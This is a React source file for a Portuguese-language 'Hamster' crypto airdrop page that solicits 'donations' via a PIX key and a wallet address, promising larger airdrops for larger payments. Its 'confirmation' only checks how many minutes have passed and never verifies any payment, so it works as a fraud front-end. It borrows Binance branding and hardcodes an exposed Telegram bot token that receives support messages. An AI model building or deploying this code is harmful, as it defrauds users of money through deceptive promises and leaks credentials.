import { useState } from 'react';
import './App.css';
import Hamster from './icons/Hamster';
import { binanceLogo, dollarCoin, hamsterCoin } from './images';
import Info from './icons/Info';
import Settings from './icons/Settings';

function App() {
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [showPaymentInfo, setShowPaymentInfo] = useState(false);
  const [confirmationClicked, setConfirmationClicked] = useState(false);
  const [confirmationTime, setConfirmationTime] = useState<Date | null>(null);
  const [showSupportForm, setShowSupportForm] = useState(false);
  const [supportMessage, setSupportMessage] = useState('');
  const [supportName, setSupportName] = useState('');

  const handlePayment = () => {
    console.log(`Address: ${address}`);
    console.log(`Amount: ${amount}`);
    setShowPaymentInfo(true);
    setConfirmationTime(new Date()); // Mark the time when the donation was processed
  };

  const handleConfirmation = () => {
    const now = new Date();
    if (confirmationTime) {
      const timeDiff = (now.getTime() - confirmationTime.getTime()) / 1000 / 60; // time difference in minutes

      if (timeDiff < 2) {
        alert('Você não doou, Faça uma Doação Honesta!');
      } else if (timeDiff >= 3 && timeDiff <= 5) {
        alert('Doação confirmada! Você receberá o airdrop quando a coleta chegar a um valor astronômico.');
      } else {
        alert('Tempo de confirmação inválido. Por favor, tente novamente.');
      }

      setConfirmationClicked(true);
    }
  };

  async function sendSupportMessageToTelegram(name: string, message: string): Promise<any> {
    const botToken = '6556947937:AAHNjuBS95r3RWTd0U-JVZsaDi7wJIwifqU'; // Substitua pelo token do seu bot
    const chatId = '-4254782461'; // Substitua pelo ID do chat (grupo ou canal)
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: `Nome: ${name}\nMensagem: ${message}`,
      }),
    });
  
    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }
  
    return response.json();
  }
  
  const handleSupportSubmit = async () => {
    try {
      await sendSupportMessageToTelegram(supportName, supportMessage);
      console.log('Support message sent to Telegram:', supportMessage);
      alert('Sua mensagem de suporte foi enviada com sucesso!');
      setSupportMessage('');
      setSupportName('');
      setShowSupportForm(false);
    } catch (error) {
      console.error('Failed to send support message to Telegram:', error);
      alert('Houve um problema ao enviar sua mensagem de suporte. Por favor, tente novamente.');
    }
  };
  

  const isFormValid = () => {
    return address.trim() !== '' && amount.trim() !== '';
  };

  return (
    <div className='bg-gray-800 flex flex-col h-screen'>
      <div className='flex-grow text-white font-bold max-w-xl mx-auto'>
        <div className='px-4 z-10'>
          <div className='flex items-center space-x-2 pt-4'>
            <div className='p-1 rounded-lg bg-gray-700 shadow-md'>
              <Hamster size={24} className='text-gray-400' />
            </div>
            <div>
              <p className='text-sm'>Savitar(CEO)</p>
            </div>
          </div>
          <div className='flex items-center justify-between space-x-4 mt-4'>
            <div className='flex items-center w-1/2'>
              <div className='w-full'>
                <div className='flex justify-between mb-1'>
                  <p className='text-sm text-gray-400'>Progress:</p>
                  <p className='text-sm text-gray-500'><span>/10</span></p>
                </div>
                <div className='flex items-center mt-1 border-2 border-gray-600 rounded-full'>
                  <div className='w-full h-2 bg-gray-700 rounded-full'>
                    <div className='progress-gradient h-2 rounded-full' style={{ width: `50%` }}></div>
                  </div>
                </div>
              </div>
            </div>
            <div className='flex items-center w-1/2 border-2 border-gray-600 rounded-full px-4 py-[2px] bg-gray-700 max-w-64 shadow-md'>
              <img src={binanceLogo} alt='Exchange' className='w-8 h-8' />
              <div className='flex-1 text-center mx-2'>
                <p className='text-xs text-gray-400 font-medium'>Convide Amigos e Ganhe!</p>
                <div className='flex items-center justify-center space-x-1'>
                  <img src={dollarCoin} alt="Dollar" className='w-[18px] h-[18px]' />
                  <Info size={20} className='text-gray-500' />
                </div>
              </div>
              <Settings className='text-white' />
            </div>
          </div>
        </div>
        
        <div className='bg-gray-900 p-4 rounded-t-lg mt-4 shadow-md'>
          <h2 className='text-xl font-bold text-white mb-4'>Faça uma Doação</h2>
          <div className='mb-4'>
            <label htmlFor='address' className='block text-gray-400 mb-2'>Endereço da sua Carteira CRIPTO:</label>
            <input
              id='address'
              type='text'
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              className='w-full p-2 bg-gray-800 border border-gray-700 rounded-md text-white'
              placeholder='Digite o endereço da carteira'
            />
          </div>
          <div className='mb-4'>
            <label htmlFor='amount' className='block text-gray-400 mb-2'>Valor da sua Doação:</label>
            <input
              id='amount'
              type='number'
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className='w-full p-2 bg-gray-800 border border-gray-700 rounded-md text-white'
              placeholder='Digite o valor da doação'
            />
          </div>
          <button
            onClick={handlePayment}
            className={`w-full p-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 transition duration-200 ${!isFormValid() ? 'opacity-50 cursor-not-allowed' : ''}`}
            disabled={!isFormValid()}
          >
            Enviar Doação
          </button>

          {showPaymentInfo && (
            <div className='mt-4 p-4 bg-gray-800 rounded-md border border-gray-700'>
              <h3 className='text-lg font-bold text-white mb-2'>Informações de Pagamento</h3>
              <p className='text-gray-400 mb-2'>Chave PIX: <span className='text-blue-400'>05215bd9-0a50-4822-87ff-04b94c5dcd4f</span></p>
              <p className='text-gray-400 mb-2'>Carteira Meta: <span className='text-blue-400'>0x6134C9C88A462BAB1867aD1b8467f190963b4ce5</span></p>
              <p className='text-gray-400 mb-2'>Valor da Doação: <span className='text-blue-400'>{amount} R$ / Equivalente em Cripto</span></p>
              <p className='text-gray-400 mt-4'>
                Agradecemos sua generosidade! O valor da sua doação ajuda a fortalecer o projeto. 
                Em reconhecimento, o valor do airdrop que você receberá será maior conforme o valor da sua doação. 
                Por favor, seja preciso com o valor da doação para garantir que você receba o airdrop corretamente.
              </p>
              <p>
                PIX: Nós salvamos a carteira que você associou junto ao valor da doação para a entrega do airdrop.  
              </p>
              <p>
                Carteira Meta: Associamos a sua carteira para o recebimento do airdrop. 
              </p>
              {!confirmationClicked && (
                <button
                  onClick={handleConfirmation}
                  className='w-full p-2 mt-4 bg-green-600 text-white rounded-md hover:bg-green-700 transition duration-200'
                >
                  Confirmar Doação
                </button>
              )}
            </div>
          )}
        </div>

        <div className='bg-gray-900 p-4 rounded-b-lg mt-4 shadow-md'>
          <h2 className='text-xl font-bold text-white mb-4'>Suporte</h2>
          {showSupportForm ? (
            <div>
              <div className='mb-4'>
                <label htmlFor='supportName' className='block text-gray-400 mb-2'>Seu Nome:</label>
                <input
                  id='supportName'
                  type='text'
                  value={supportName}
                  onChange={(e) => setSupportName(e.target.value)}
                  className='w-full p-2 bg-gray-800 border border-gray-700 rounded-md text-white'
                  placeholder='Digite seu nome'
                />
              </div>
              <div className='mb-4'>
                <label htmlFor='supportMessage' className='block text-gray-400 mb-2'>Mensagem:</label>
                <textarea
                  id='supportMessage'
                  value={supportMessage}
                  onChange={(e) => setSupportMessage(e.target.value)}
                  className='w-full p-2 bg-gray-800 border border-gray-700 rounded-md text-white'
                  placeholder='Digite sua mensagem'
                />
              </div>
              <button
                onClick={handleSupportSubmit}
                className='w-full p-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 transition duration-200'
              >
                Enviar Mensagem de Suporte
              </button>
              <button
                onClick={() => setShowSupportForm(false)}
                className='w-full p-2 mt-2 bg-red-600 text-white rounded-md hover:bg-red-700 transition duration-200'
              >
                Cancelar
              </button>
            </div>
          ) : (
            <button
              onClick={() => setShowSupportForm(true)}
              className='w-full p-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 transition duration-200'
            >
              Relatar Problema
            </button>
          )}
           <a href="/exchange" className='text-center text-[#85827d] w-1/5'>
       <img src={hamsterCoin} alt="Airdrop" className='w-8 h-8 mx-auto'/>
       <p className='mt-1'>Home</p>
       </a>
        </div>
      </div>
      
    </div>
    
  );
}

export default App;
